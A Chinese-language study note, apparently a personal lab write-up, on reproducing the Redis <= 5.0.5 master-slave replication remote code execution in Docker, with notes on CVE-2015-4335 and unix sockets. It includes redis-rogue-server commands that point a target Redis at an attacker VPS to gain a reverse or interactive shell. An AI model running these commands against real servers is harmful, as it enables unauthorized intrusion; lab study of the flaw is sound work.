---
title: "Redis <= 5.0.5 主从复制 RCE学习笔记"
slug: qav794
date: 2021-03-20T18:50:32+08:00
source: yuque/penetration
---

```http
# Redis <= 5.0.5
 python redis-rogue-server.py --rhost [redis] --rport=6379 --lhost [vps] --lport 443
```

[redis-rogue-server_poison.zip](https://www.yuque.com/attachments/yuque/0/2021/zip/166008/1616246856613-e8e31423-d43f-40c3-8ede-e6116ccd8bd3.zip)

# 一、前言
## 环境搭建
使用docker搭建好环境

```http
docker pull damonevking/redis5.0 
docker run -p 6379:6379 -d damonevking/redis5.0 redis-server
```



## 正常使用主从功能
> Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。
>

假设Redis-1是在`63791`端口，Redis-2在`63792`端口，

我们让`Redis-1`当老大（`Master`），那么就在Redis-2上配置`SLAVEOF [redis_ip] 63791`即可

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616250499593-c3c01f9b-e6a5-4ed3-98d3-20cf7a33b0c6.png)正常情况下，主节点能读能写；从节点作为“打工人”，自己只能读数据（主节点同步过来的），不能写数据。

# 二、漏洞复现****
**漏洞利用的前提**

+ `Redis <= 5.0.5`
+ `Redis`服务未授权访问（<font style="color:#333333;">bind 由</font>`127.0.0.1`<font style="color:#333333;"> 改为</font>`0.0.0.0`，`protected-mode`<font style="color:#333333;">为</font>`no`<font style="color:#333333;">）</font>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616247064006-58d215e2-4dfc-4ed5-94d4-f7d659cf9ed5.png)

**具体步骤**

具体实现上，有两种大同小异的姿势，分别如下：

**第一种方式，**使用[https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)里面的脚本（**不建议，反弹shell容易把环境搞崩**）

直接指定漏洞地址即可。

有交互式的shell，或是反弹shell两种选择，<font style="color:#BFBFBF;"></font>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616247628866-83527602-1fcf-4f7f-9e7d-043876376a4b.png)

<font style="color:#BFBFBF;">交互式的shell</font>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616247825762-1ad6d36c-e634-42c3-83a6-ff0a35e069e8.png)

<font style="color:#F5222D;">反弹</font><font style="color:#F5222D;">shell</font>

值得指出的是，由于反弹shell的过程是阻塞的，猜测这个过程中Redis应该不能去做其它事情。

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616248441586-96aa7831-7697-4081-a418-15c2c02f088d.png)

而且反弹shell这种利用方式真的不稳定，把Redis的docker搞崩了好多次。。。对应的代码在下面

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616249463295-d945d6d2-b3ec-4ab9-a35e-37fa1dabeb92.png)

---

**第二种方式呢**，采用[https://github.com/LoRexxar/redis-rogue-server](https://github.com/LoRexxar/redis-rogue-server)里面的脚本（**建议，单纯的执行命令）**

一样的命令

```http
python redis-rogue-server.py --rhost [redis_ip] --rport=6379 --lhost [your_vps_ip] --lport 21000
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616247400332-3ed7d2e2-6db1-444c-bad1-4a4185fec486.png)



值得注意的是，上面的这两种攻击方式，除了可以正常执行命令之外，还会在redis上定义了一个恶意函数`system.exec`，我们连接到Redis上就能直接用，见下图的效果

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616248705166-791c1d7c-0250-4f87-ad6f-19ba6721ce43.png)



所以，如果你只是单纯地想验证漏洞，只用`interactive shell`就好啊。

---

# 三、SSRF场景下的主从RCE[ToDo]
等遇到对应的场景，再更新啦

+ 要是Redis有密码时，该怎么办？
+ 主从写webshell

TODO：[https://xz.aliyun.com/t/8613](https://xz.aliyun.com/t/8613)

[https://xz.aliyun.com/t/5665#toc-3](https://xz.aliyun.com/t/5665#toc-3)



# 四、拓展阅读
Redis未授权的攻击面

## （）CVE-2015-4335：Redis EVAL Lua Sandbox Security Bypass Vulnerability
> + Redis < 2.8.21 
> + Redis < 3.0.2 
>
> i.e. Redis 2.8.21 and 3.0.2 have been released to fix this issue.
>
> **Refs**：
>
> + [https://redis.com/blog/cve-2015-4335dsa-3279-redis-lua-sandbox-escape/](https://redis.com/blog/cve-2015-4335dsa-3279-redis-lua-sandbox-escape/)
> + [http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/](http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/)
> + [http://wp.blkstone.me/2018/08/pivotal-software-redis-2-8-21-3-x-3-0-2-rce/](http://wp.blkstone.me/2018/08/pivotal-software-redis-2-8-21-3-x-3-0-2-rce/)
>

Build

```basic
docker pull redis:3.0.1
docker run -p 6379:6379 --name redis_3.0.1 redis:3.0.1
```

EXP

+ [http://wp.blkstone.me/2018/08/pivotal-software-redis-2-8-21-3-x-3-0-2-rce/](http://wp.blkstone.me/2018/08/pivotal-software-redis-2-8-21-3-x-3-0-2-rce/)





# 五、Q&A
遇到的问题，记录在这里

## 为什么执行config失败了
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629453305965-d589535d-57d7-4a6d-aa35-03553e2b5fe4.png)

可能因为Redis禁用了命令，see [https://blog.csdn.net/elesos/article/details/81280291](https://blog.csdn.net/elesos/article/details/81280291)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1629453357912-b3b09da7-3d95-4cdf-83d7-8363a5fe1f70.png)

## 运行在Unix Socket下的Redis
> + 其实，对于linux系统，如果redis客户端和服务端都在同一台服务器，可以使用 `unix socket` ，不需要走TCP监听网络端口，使用后效果非常明显——用`unixSocket`的方式，速度至少提高一半。
> + 连接到Unix套接字上的Redis服务器的正确URL语法是`unix:///tmp/redis.sock`
>

在官方文档中，有这么一段话

> To use a UNIX socket instead, open up the file `/etc/redis.conf` and locate the line mentioning unixsocket. Replace it with the following:
>

在Redis的配置文件里配置就行啦。

连接方式：

```bash
redis-cli -s /tmp/redis.sock
```

运行在unix socket模式下的Redis，暂时还没有找到SSRF可以攻击的方案。（除非用类似于fopen这种句柄的方式来SSRF才有可能）



# Refs
+ [Redis <= 5.0.5 主从复制 RCE · WgpSec POC文库](https://poc.wgpsec.org/PeiQi_Wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Redis/Redis%20%E5%B0%8F%E4%BA%8E5.0.5%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE%20.html)
+ [https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
+ [https://www.chabug.org/web/669.html](https://www.chabug.org/web/669.html)
+ [https://paper.seebug.org/975/](https://paper.seebug.org/975/)
+ [https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_4.jpg](https://yulegeyublog.oss-cn-beijing.aliyuncs.com/redis_post_4.jpg)









此外，了解一下洞主，不玩推的**独立安全研究员**。（慕了慕了）

+ [Pavel Toporkov | 领英](https://ru.linkedin.com/in/pavel-toporkov-23360961)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616237526610-36f967fc-80b9-4cd4-88c3-c0c7f53f631e.png)

